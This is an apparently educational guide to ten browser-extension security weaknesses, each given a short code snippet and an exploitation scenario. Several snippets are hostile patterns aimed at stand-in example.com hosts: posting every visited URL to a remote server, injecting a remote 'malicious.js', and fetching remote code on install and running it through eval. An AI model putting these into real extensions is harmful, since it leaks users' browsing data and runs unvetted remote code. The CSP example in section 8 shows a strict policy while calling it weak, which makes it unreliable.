# Browser Extension Security Vulnerabilities

This document outlines common security vulnerabilities found in browser extensions and provides examples of how attackers can exploit these vulnerabilities.

## 1. Permissions Overreach
**Vulnerable Code Example:**
```json
{
  "manifest_version": 2,
  "name": "My Extension",
  "permissions": [
    "tabs",
    "http://*/*",
    "https://*/*",
    "storage"
  ]
}
```

**Exploitation Scenario:**

An extension with broad permissions can access all tabs and browsing data. If the extension is compromised, an attacker can capture sensitive information from any website the user visits, including passwords and personal data.

## 2. Data Leakage

**Vulnerable Code Example:**

```javascript
chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
  if (changeInfo.status === 'complete') {
    fetch('http://example.com/track', {
      method: 'POST',
      body: JSON.stringify({ url: tab.url })
    });
  }
});
```
This code can leak user URLs to a remote server.

**Exploitation Scenario:**

An extension sending the URLs of all visited pages to a remote server can inadvertently leak sensitive information, especially if users visit banking or personal sites.

## 3. Cross-Site Scripting (XSS)

**Vulnerable Code Example:**

```javascript
let userInput = document.getElementById('input').value;
document.getElementById('output').innerHTML = userInput; // No sanitization
```
**Exploitation Scenario:**

User inputs can execute scripts in the page's context. An attacker could inject scripts that steal cookies, session tokens, or sensitive data.

## 4. Insecure Communication

**Vulnerable Code Example:**
```javascript
fetch('http://example.com/api/data')
```
**Exploitation Scenario:**

Data sent over insecure HTTP can be intercepted by attackers on the same network, allowing them to capture sensitive information, such as tokens or personal data.

## 5. Code Injection

**Vulnerable Code Example:**
```javascript
let script = document.createElement('script');
script.src = 'http://example.com/malicious.js';
document.body.appendChild(script);
```
**Exploitation Scenario:**

If an attacker controls the script URL, they can inject malicious code into the page, leading to data theft or manipulation of the page’s functionality.

## 6. Malicious Updates

**Vulnerable Code Example:**

```javascript
chrome.runtime.onInstalled.addListener(() => {
  fetch('http://example.com/update-script.js')
    .then(response => response.text())
    .then(eval); // Potentially unsafe
});

```
**Exploitation Scenario:**

If the update mechanism is compromised, attackers can push malicious code to users without their knowledge, potentially gaining control over their browsers.


## 7. Third-Party Dependencies

**Vulnerable Code Example:**

```json
{
  "dependencies": {
    "vulnerable-lib": "1.0.0"
  }
}

```
**Exploitation Scenario:**

An extension relying on outdated third-party libraries may become vulnerable if those libraries have known security flaws that attackers can exploit.

## 8. Lack of Content Security Policy (CSP)

**Vulnerable Code Example:**

```json

{
  "manifest_version": 2,
  "name": "My Extension",
  "content_security_policy": "default-src 'self'"
}

```

**Exploitation Scenario:**

Without a strong CSP, attackers can inject untrusted content, increasing the risk of XSS and other attacks that manipulate the extension’s behavior.

## 9. Insecure Storage

**Vulnerable Code Example:**

```javascript
localStorage.setItem('token', 'my-secret-token'); // No encryption
```
**Exploitation Scenario:**

If an attacker gains access to the local storage, they can easily retrieve sensitive information, such as tokens or user credentials, leading to unauthorized access.

## 10. Insufficient Privacy Controls

**Vulnerable Code Example:**

```json
{
  "manifest_version": 2,
  "name": "My Extension",
  "description": "A cool extension with no privacy policy."
}

```
**Exploitation Scenario:**

Users may be unaware of how their data is being collected or used, leading to potential abuse of their information without consent or awareness.
